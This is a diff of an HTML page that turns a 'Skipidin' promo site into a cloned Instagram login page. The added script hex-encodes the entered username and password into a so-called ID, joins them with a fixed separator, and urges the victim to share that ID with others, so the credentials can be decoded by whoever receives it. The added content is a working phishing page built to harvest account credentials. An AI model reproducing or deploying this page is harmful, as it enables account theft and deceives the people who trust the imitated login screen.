@@ -1,527 +1,359 @@
-<!DOCTYPE HTML>
-<html>
-<head>
-<title>Skipidin-Relax your soul with us</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
-<link rel="stylesheet" href="file:///storage/88F0-17F2/Android/data/com.android.chrome/files/Download/bootstrap.min.css">
-<script src="stylesheet" href="file:///storage/88F0-17F2/Android/data/com.android.chrome/files/Download/bootstrap.min.js"></script>
+<!doctype html><html lang="en"><head>
+<meta charset="UTF-8">
+<title>Skipidin-Login with Instagram</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<link rel="stylesheet" href="style.css">
+<link rel="shortcut icon" type="image/x-icon" href="./favicon.ico">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
 <style>
-*{
-	padding: 0;
+.login {
+  background: rgba(250,250,250,1);
+  border: 1px solid rgb(236, 234, 234);
+  border-radius: 0px;
+  height: 410px;
+  margin: 30px auto 0;
+  width: 400px;
+}
+.login h1 {
   box-sizing: border-box;
-  margin: auto;
-  font-family: Helvetica;
+  margin: 20px 0 30px 0;
+  text-align: center;
+  user-select: none;
 }
-body{
-	background: #79C1F1;
-	font-size: 3vw;
-	height: 300px;
-	color: #1D245C;
+input[type="password"], input[type="text"] {
+  background: rgba(250,250,250,1);
+  border: 1px solid rgb(236, 234, 234);
+  border-radius: 3px;
+  box-shadow: 0 1px #fff;
+  box-sizing: border-box;
+  color: black;
+  height: 39px;
+  margin: 10px 0 0 40px;
+  padding: 10px;
+  font-size: 13px;
+  width: 320px;
 }
-#hodyh1{
-	font-weight: bold;
-	font-size: 5.5vw;
+input[type="password"]::placeholder, input[type="text"]::placeholder {
+  color: rgb(165, 164, 164);
 }
-#hodyh2{
-	font-weight: lighter;
-	font-size: 4vw;
+input[type="password"]:focus, input[type="text"]:focus {
+  outline: 0;
+  border: 1px solid #a1a1a1;
 }
-</style>
+
+.forgot {
+  color: #7f7f7f;
+  display: inline-block;
+  box-sizing: border-box;
+  font: 12px/1 sans-serif;
+  left: -19px;
+  position: relative;
+  text-decoration: none;
+  top: -15px;
+  transition: color .4s;
+}
+.forgot:hover { color: #3b3b3b }
+
+input[type="submit"] {
+  background: #3897F0;
+  border: 0px;
+  border-radius: 4px;
+  box-sizing: border-box;
+  color: #f8f8f8;
+  font-weight: 600;
+  height: 29px;
+  margin: 14px 0 0 40px;
+  width: 320px;
+}
+input[type="submit"]:hover, input[type="submit"]:focus {
+  background: rgb(48, 144, 233);
+  outline: 0;
+}
 
 
+.divider {
+  overflow: hidden;
+  text-align: center;
+  box-sizing: border-box;
+  color:rgb(165, 164, 164);
+  font-size: 13.5px;
+  font-weight: 500;
+  margin: 20px 0 0 40px;
+  width: 320px;
+}
 
+.divider:before,
+.divider:after {
+  background-color: rgb(224, 221, 221);
+  content: "";
+  display: inline-block;
+  height: 1.2px;
+  position: relative;
+  vertical-align: middle;
+  width: 50%;
+}
 
+.divider:before {
+  right: 2em;
+  margin-left: -50%;
+}
 
+.divider:after {
+  left: 2em;
+  margin-right: -50%;
+}
 
-<style>
-@media only screen and (max-width:1500px){
-  /* For desktop: */
-body{
-	font-size: 2vw;
+.fbwrapper {
+  text-align: center;
+  margin-top: 25px;
 }
-#hody{
-	background: #4AC959;
-	position: fixed;
-	padding: 6vw;
-	width: 100%;
-z-index: 100;
+
+.fb a{
+  font-weight: 600;
+  font-size: 14px;
+  display: inline;
+  vertical-align: middle;
+  margin: 20px 0 0 10px;
+  text-decoration: none;
+  color: rgb(107, 106, 106);
+  
 }
-#hh1{
-margin: 100px 0 50px 50px;
-font-size: 8vw;
+.fb img {
+  vertical-align: middle;
 }
-#stpc{
-	margin: 0 0 0 0;
-white-space: nowrap;
-height: 750px;
-padding: 0 30px 0 30px;
-overflow-x: scroll;
-position: relative;
-z-index: 2;
-border-radius: 8px 8px 8px 8px;
+
+.forgotwrapper{
+  text-align: center;
+  margin-top: 35px;
 }
-#stpc img{
-height: 700px;
-width: 700px;
-padding: 0;
-border-radius: 8px 8px 8px 8px;
-position: relative;
-margin: 0 30px 0 30px;
+
+.forgot a{
+  margin: 20px 0 0 40px;
+  text-decoration: none;
+  color: rgb(107, 106, 106);
 }
-#sbsintr{
-	margin: 0 30px 0 55px;
-	font-weight: 500;
+
+.infobox {
+  background: #fff;
+  border: 1px solid rgb(236, 234, 234);
+  border-radius: 0px;
+  height: 60px;
+  margin: 10px auto 0;
+  width: 400px;
 }
-.google-button {
-	margin: 0 50px 30px -50px;
+.infobox p {
+  box-sizing: border-box;
+  margin: 22px 0 30px 0;
+  text-align: center;
+  user-select: none;
+  font-size: 14px;
+}
+
+.infobox p a{
+  color: rgb(94, 163, 243);
+  text-decoration: none;
+  font-weight: 600;
+}
+
+.apps {
   height: 100px;
-  width: 760px;
-  border-width: 0;
-  background: white;
-  color: #737373;
-  border-radius: 10px;
-  white-space: nowrap;
-  box-shadow: 2px 2px 0px 2px rgba(0, 0, 0, 0.05);
-  -webkit-transition-property: background-color, box-shadow;
-  transition-property: background-color, box-shadow;
-  -webkit-transition-duration: 150ms;
-          transition-duration: 150ms;
-  -webkit-transition-timing-function: ease-in-out;
-          transition-timing-function: ease-in-out;
-  padding: 0;
+  margin: 20px auto 0;
+  width: 400px;
 }
-.google-button:focus, .google-button:hover {
-  box-shadow: 2px 10px 10px 2px rgba(0, 0, 0, 0.1);
-}
-.google-button:active {
-  background-color: #e5e5e5;
-  box-shadow: none;
-  -webkit-transition-duration: 10ms;
-          transition-duration: 10ms;
-}
-.google-button__icon {
-  display: inline-block;
-  vertical-align: middle;
-  marin: 15px 0 20px 20px;
-  width: 50px;
-  height: 50px;
+
+.apps p {
   box-sizing: border-box;
+  margin: 10px 0 30px 0;
+  text-align: center;
+  user-select: none;
+  font-size: 14px;
 }
-.google-button__text {
-  display: inline-block;
-  vertical-align: middle;
-  padding: 0;
-  marin: 0 20px 0 100px;
-  font-size: 4.5vw;
-  font-weight: bold;
-  font-family: 'Roboto',arial,sans-serif;
-}
-button ~ button {
-  marin-left: 40px;
-}
-#sbsbtn{
-	margin: 90px 150px 50px 160px;
-}
-#fdbk{
-	margin: 0 0 0 0;
-	position: fixed;
-	z-index: 10;
-	width: 160px;
-	height: 160px;
-	top: 87%;
-	left: 77%;
-}
-#footer{
-background: white;
-height: 300%;
-font-size: 5vw;
-}
-#footerh2{
-margin: 0 0 0 50px;
-background: white;
-border-radius: 50px;
-padding: 10px 10px 10px 20px;
-width: 250px;
-font-weight: bold;
-font-size: 5.5vw;
-}
-#footer hr{
-	width: 100%;
-	margin: 0 0 50px 0;
-	border: 5px solid green;
-	background: green;
-}
-#jng{
-	margin: 0 0 0 285px;
-	border-radius: 20px;
-	background: lightblue;
-padding: 25px 0 25px 70px;
-font-size: 5vw;
-width: 410px;
-font-weight: 200;
-}
-#fw{
-	margin: -75px 0 20px 400px;
-	font-weight: 10;
-	font-size: 4.5vw;
-}
-#cpr{
-margin: 40px 0 10px 55px;
-font-size: 4.5vw;
-}
-#hlp{
-	margin: 0 0 20px 20px;
-	font-weight: bolder;
-}
-#hlpp{
-	margin: 0 0 0 60px;
-	font-weight: bold;
-	font-size: 4.5vw;
-}
-}
-@media only screen and (max-width:800px){
-  /* For tablets: */
-body{
-	font-size: 4.5vw;
-}
-#hody{
-	background: #FDEFE2;
-color: #1D245C;
-	position: fixed;
-	padding: 19px;
-	width: 100%;
-z-index: 100;
-}
-#stpc{
-white-space: nowrap;
-height: 350px;
-padding: 0 20px 0 20px;
-overflow-x: scroll;
-position: relative;
-z-index: 2;
-margn: 20px 0 -20px 0;
-}
-#hh1{
-font-size: 10vw;
-	border-radius: 8px;
-	margin: 50px 0 50px 20px;
-	padding: 6px;
-	background: #fff;
-	width: 160px;
-}
-#stpc img{
-height: 200px;
-width: 200px;
-padding: 0;
-border-radius: 10px;
-position: relative;
-margin: 17px 20px 0 20px;
-}
-#sbsintr{
-	margin: 0 10px 0 20px;
-	font-weight: 700;
-}
-.google-button {
-	margin: 0 0 20px 0;
-  height: 40px;
-  width: 290px;
-  border-width: 0;
-  background: white;
-  color: #737373;
-  border-radius: 5px;
-  white-space: nowrap;
-  box-shadow: 1px 1px 0px 1px rgba(0, 0, 0, 0.05);
-  -webkit-transition-property: background-color, box-shadow;
-  transition-property: background-color, box-shadow;
-  -webkit-transition-duration: 150ms;
-          transition-duration: 150ms;
-  -webkit-transition-timing-function: ease-in-out;
-          transition-timing-function: ease-in-out;
-  padding: 0;
-}
-.google-button:focus, .google-button:hover {
-  box-shadow: 1px 4px 5px 1px rgba(0, 0, 0, 0.1);
-}
-.google-button:active {
-  background-color: #e5e5e5;
-  box-shadow: none;
-  -webkit-transition-duration: 10ms;
-          transition-duration: 10ms;
-}
-.google-button__icon {
-  display: inline-block;
-  vertical-align: right;
-  margin: 7px 20px 8px 0;
-  width: 25px;
-  height: 25px;
+
+.apps span a{
   box-sizing: border-box;
+  margin-left: 28px;
 }
-.google-button__text {
-  display: inline-block;
-  vertical-align: left;
-  padding: 0 24px;
-  margin: 0 18px 0 -20px;
-  font-size: 4.3vw;
-  font-weight: bold;
-  font-family: 'Roboto',arial,sans-serif;
+
+.app span a img{
+  padding-left: 20px;
 }
-.google-button__text2 {
-  display: inline-block;
-  vertial-align: middle;
-  padding: 0 24px;
-  margin: 0 0 0 -19px;
-  font-size: 4.3vw;
-  font-weight: bold;
-  font-family: 'Roboto',arial,sans-serif;
+.footer{
+  position: relative;
+  left: 0;
+  bottom: 0;
+  margin-top: 50px;
+  width: 100%;
+  text-align: center;
 }
-.google-button__text3 {
-  display: inline-block;
-  vertica-align: middle;
-  padding: 0 24px;
-  margin: 0 0 0 -19px;
-  font-size: 4.3vw;
-  font-weight: bold;
-  font-family: 'Roboto',arial,sans-serif;
+.footer p a {
+  color: #003569;
+  text-decoration: none;
+  padding-left: 10px;
+  font-size: 13px;
 }
-.google-button__text4 {
-  display: inline-block;
-  verticl-align: middle;
-  padding: 0 24px;
-  margin: 0 0 0 -19px;
-  font-size: 4.3vw;
-  font-weight: bold;
-  font-family: 'Roboto',arial,sans-serif;
-}
-button ~ button {
-  margn-left: 20px;
-}
-#sbsbtn{
-	margin: 20px 35px 20px 37px;
-}
-#fdbk{
-	margin: 50px 20px 30px 280px;
-	position: fixed;
-	z-index: 10;
-	width: auto;
-	height: auto;
-	top: 78%;
-	left: 1%;
-}
-#footer{
-background: #fff;
-height: 180%;
-padding: 0;
-}
-#footerh2{
-margin: 0 0 0 20px;
-background: white;
-border-radius: 50px;
-padding: 5px 5px 5px 10px;
-width: 100px;
-font-weight: bold;
-font-size: 6vw;
-}
-#footer hr{
-	width: 99%;
-	margin: 0 0 20px 0;
-	border: 1px solid white;
-	background: white;
-}
-#jng{
-	margin: 0 0 0 100px;
-	border-radius: 5px;
-	background: #003A70;
-padding: 7.5px 0 7.5px 25px;
-font-size: 6vw;
-width: 170px;
-font-weight: 200;
-color: white;
-}
-#fw{
-	margin: -25px 0 10px 170px;
-	font-weight: 500;
-	font-size: 4.5vw;
-}
-#cpr{
-margin: 30px 0 10px 50px;
-font-weight: bold;
-}
-#hlp{
-	margin: 0 0 10px 10px;
-	font-weight: bolder;
-}
-#hlpp{
-	margin: 20px 10px 0 15px;
-	font-weight: bold;
-}
-#hlpp1{
-	margin: 20px 10px 0 15px;
-	font-weight: bold;
-	font-size: 4.5vw;
-}
-#hlpp2{
-	margin: -24px 10px 0 15px;
-	font-weight: bold;
-	font-size: 4.5vw;
-}
-#mbr{
-margin: -147px 0 0 200px;
+
+.footer p span {
+  color: rgb(189, 186, 186);
+  padding-left: 80px;
+  font-size: 13px;
 }
 #id{
-margin: -106px 0 30px 200px;
+		position: relative;
+  left: 0;
+  bottom: 0;
+  margin-top: 50px;
+  width: 100%;
+  text-align: center;
 }
-#stpc{
-white-space: nowrap;
-height: 350px;
-padding: 0 20px 0 10px;
-overflow-x: scroll;
-position: relative;
-z-index: 2;
-border-radius: 0;
-margin: 20px 0 0 0;
+#id #b2{
+		background: #00A1E1;
+		color: #061148;
+		padding: 5px;
+		border-radius: 8px;
 }
-#stpc img{
-height: 200px;
-width: 330px;
-paddng: 100px 0 0 0;
-border-radius: 8px;
-position: relative;
-margin: 0 20px 0 10px;
-position: relative;
-z-index: 1;
+#id #h32{
+		background: #BB0A30;
+		color: #fff;
+		padding: 5px;
+		border-radius: 8px;
 }
-#ofo{
-	margin: 10px 0 20px 0;
+#id a{
+		background: #FF0033;
+		color: #fff;
+		padding: 7.5px;
+		border: none;
+		border-radius: 8px;
+		font-size: 5vw;
+		text-decoration: none;
 }
-#ofo h1{
-	margin: 0 0 30px 10px;
-	background: white;
-	padding: 5px;
-	border-radius: 8px;
-	width: 300px;
+#scs{
+		background: #4AC959;
+		padding: 2vw 3vw 2vw 3vw;
+		border-radius: 8px;
+		position: relative;
+		z-index: 5000;
+		font-size: 3.5vw;
+		margin: -300px 0 150px -300px;
+		width: 100%;
+		text-align: center;
+		visibility: hidden;
 }
-#ofo h4{
-	margin: 0 20px 50px 20px;
+#scs h3{
+		font-weight: bolder;
+		color: #455A64;
 }
-#aftr{
-	margin: 0 10px 50px 20px;
-	background: #fff;
-	padding: 5px 5px 5px 10px;
-	border-radius: 8px;
-	font-weight: bold;
-	font-size: 8vw;
+#scs h5{
+		font-weight: bolder;
+		color: #455A64;
 }
-#aftrh1{
-	margin: -100px 0 30px 10px;
-	background: white;
-	padding: 5px;
-	border-radius: 8px;
-	width: 260px;
+#too{
+		background: transparent;
+		font-weight: bolder;
+		font-size: 3vw;
+		border: none;
+		color: #fff;
+		margin: 0 0 0 400px;
 }
-#aftr h4{
-	color: #1DB954;
-}
-#aftr #h2id{
-	color: #E4011A;
-}
+#scs b{
+		background: #00A1E1;
+		color: #061148;
+		padding: 5px;
+		border-radius: 8px;
 }
 </style>
 </head>
-<body id="dm">
-<div id="hody">
-<h id="hodyh1">Skipidin</h>
-<h id="hodyh2">Provided by yteicosf</h>
+<body>
+<div id="all">
+<div class="login">
+<h1><img src="https://i.imgur.com/wvLiKam.png" width="200px" height="68px"></h1>
+<form name="myform" method="post" action="/storage/emulated/0/Dcoder/LVUdw7AWZEF4raPKSO5N.design" onsubmit="return validateform()">
+<input placeholder="Phone number, username, or email" type="text" name="name" required>
+<input type="password" name="password" placeholder="Password" required>
+<input type="submit" value="Log In">
+<br>
+</form>
+<div class="divider"><b>OR</b></div>
+<div class="fbwrapper"><div class="fb"><a href="https://facebook.com"><img src="https://i.imgur.com/exksovo.png">  Log in with Facebook</a></div></div>
+<div class="forgotwrapper"><div class="forgot"><a href="https://instagram.com">Forgot password?</a></div></div>
 </div>
-<br>
-<br>
-<br>
-<br>
-<div id="ofo">
-<h1>Best offers of the month</h1>
-<h4>Swipe to the left (<<<) and select your way to sign in</h4>
+<div class="infobox">
+  <p>Don't have an account? <a href="https://instagram.com">Sign up</a></p>
 </div>
-<div id="stpc">
-<img src="file:///storage/88F0-17F2/Android/data/com.android.chrome/files/Download/3f1aab8d-f3ca-4118-9cd7-53d3289383ee.jpeg">
-<img src="file:///storage/88F0-17F2/Android/data/com.android.chrome/files/Download/3f1aab8d-f3ca-4118-9cd7-53d3289383ee.jpeg">
-<img src="file:///storage/88F0-17F2/Android/data/com.android.chrome/files/Download/3f1aab8d-f3ca-4118-9cd7-53d3289383ee.jpeg">
-<img src="file:///storage/88F0-17F2/Android/data/com.android.chrome/files/Download/3f1aab8d-f3ca-4118-9cd7-53d3289383ee.jpeg">
+<div id="scs">
+<h1 id="too" onclick="tho()">×</h1>
+<h3>Login was successfully completed</h3>
+<h5>Please click the button down "Click to continue" to continue</h5>
+<h5>This is your id<br><br><b id="b">It will appear here after log in</b></h5>
 </div>
-<h1 id="aftrh1">After Signing in</h1>
-<div id="aftr">
-<h4>✓ Free Netflix account</h4>
-<h4>✓ Free Spotify premium</h4>
-<h4>✓ Place within the contest</h4>
-<h4 id="h2id">× VIP</h4>
+<div class="apps">
+  <p>Get the app.</p>
+  <span><a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src="https://i.imgur.com/lREV6Qa.png" height="45px" width="153px"></a><a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DXRR9_gALAAHKOzMSO3MkAOZ0JJtC%26utm_content%3Dlo%26utm_medium%3Dbadge"><img src="https://i.imgur.com/DFQNKXK.png" height="45" width="151px"></a></span>
 </div>
-<div id="footer">
-<hr>
-<h2 id="footerh2">Skipidin</h2>
-<h2 id="fw">Provided by yteicosf</h2>
-<br>
-<a href="#"><h2 id="jng">Join Skipidin</h2></a>
-<br>
-<div id="skp">
-<h4 id="hlp">Skipidin</h4>
-<a href="#"><p id="hlpp">Features</p></a>
-<a href="#" onclick="swtch()"><p id="hlpp1">Dark Mode</p></a>
-<a href="#" onclick="trn()"><p id="hlpp2">Light mode</p></a>
-<a href="#"><p id="hlpp">Benefits</p></a>
+<div class="footer">
+  <p>
+      <a href="https://www.instagram.com/about/us/">ABOUT US</a>
+      <a href="https://help.instagram.com/">SUPPORT</a>
+      <a href="https://instagram-press.com/">PRESS</a>
+      <a href="https://www.instagram.com/developer/">API</a>
+      <a href="https://www.instagram.com/about/jobs/">JOBS</a>
+      <a href="https://help.instagram.com/519522125107875">PRIVACY</a>
+      <a href="https://help.instagram.com/581066165581870">TERMS</a>
+      <a href="https://www.instagram.com/explore/locations/">DIRECTORY</a>
+      <a href="https://www.instagram.com/directory/profiles/">PROFILES</a>
+      <a href="https://www.instagram.com/directory/hashtags/">HASHTAGS</a>
+      <a href="">LANGUAGE</a>
+      <span>© 2020 INSTAGRAM</span>
+  </p>
 </div>
-<div id="mbr">
-<h4 id="hlp">Membership</h4>
-<a href="#"><p id="hlpp">Become a VIP client</p>
-<a href="#"><p id="hlpp">Sign in</p></a>
-</div>
-<br>
-<br>
-<div id="hlp2">
-<h4 id="hlp">Help</h4>
-<a href="#"><p id="hlpp">Help center</p></a>
-<a href="#"><p id="hlpp">FAQ</p></a>
 </div>
 <div id="id">
-<h4 id="hlp">ID</h4>
-<a href="#"><p id="hlpp">Subscribe to get your ID</p></a>
+<h3>ID: </h3>
+<b id="b2">Your ID will appear here after signing up</b>
+<h3 id="h32">Notice: Share this ID with friends and users so that they find you</h3>
+<a href="" id="fme"><b>Click to Continue >>></b></b></b></b></a>
 </div>
-<br>
-<h4 id="cpr">2020 © Skipidin. All rights reserved.</h4>
-</div>
+  <script src="http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <script>
-var hl2 = document.getElementById("hlpp2");
-var hl1 = document.getElementById("hlpp1");
-var elem1 = document.getElementById("hlpp1");
-var elem2 = document.getElementById("hlpp2");
-var hod = document.getElementById("hody");
-var fet = document.getElementById("footer");
-
-hl2.style.visibility = "hidden";
-function swtch(){
-  var bort = document.getElementById("dm");
-  bort.style.background = "#1D245C";
-  bort.style.color = "#79C1F1";
-  hod.style.background = "#1D245C";
-  hod.style.color = "#FDEFE2";
-  fet.style.background = "#FDEFE2";
-  fet.style.color = "#1D245C";
-  elem2.innerHTML = "Light Mode";
-  hl2.style.visibility = "visible";
-  hl1.style.visibility = "hidden";
+function ascii_to_hexa(str)
+  {
+	var arr1 = [];
+	for (var n = 0, l = str.length; n < l; n ++) 
+     {
+		var hex = Number(str.charCodeAt(n)).toString(16);
+		arr1.push(hex);
+	 }
+	return arr1.join('');
+   }
+</script>
+<script>
+var fm = document.getElementById("fme");
+var to = document.getElementById("scs");
+fm.style.visibility = "hidden";
+function validateform(){
+var name=document.myform.name.value;
+var password=document.myform.password.value;
+var all = document.getElementById("all");
+var elem2 = document.getElementById("b");
+var elem22 = document.getElementById("b2");
+if(password != ""){
+ascii_to_hexa(name+password);
+	elem2.innerHTML = "#"+ascii_to_hexa(name)+"2a1q1z2"+ascii_to_hexa(password);
+	elem22.innerHTML = "#"+ascii_to_hexa(name)+"2a1q1z2"+ascii_to_hexa(password);
+	fm.style.visibility = "visible";
+	to.style.visibility = "visible";
+	return false;
 }
-function trn(){
-  var budd = document.getElementById("dm");
-  budd.style.background = "white";
-  budd.style.color = "lightgreen";
-  elem2.innerHTML = "Dark Mode";
-  hl2.style.visibility = "hidden";
-  hl1.style.visibility = "visible";
-  budd.style.background = "#79C1F1";
-  budd.style.color = "#1D245C";
-  hod.style.background = "#FDEFE2";
-  hod.style.color = "#1D245C";
-  fet.style.background = "#fff";
+else{
+	return false;
+}
 }
 </script>
-</body>
-</html>
-    
+<script>
+function tho(){
+		var to = document.getElementById("scs");
+var too = document.getElementById("too");
+  to.style.visibility = "hidden";
+  too.style.visibility = "hidden";
+}
+</script>
+</body></html>
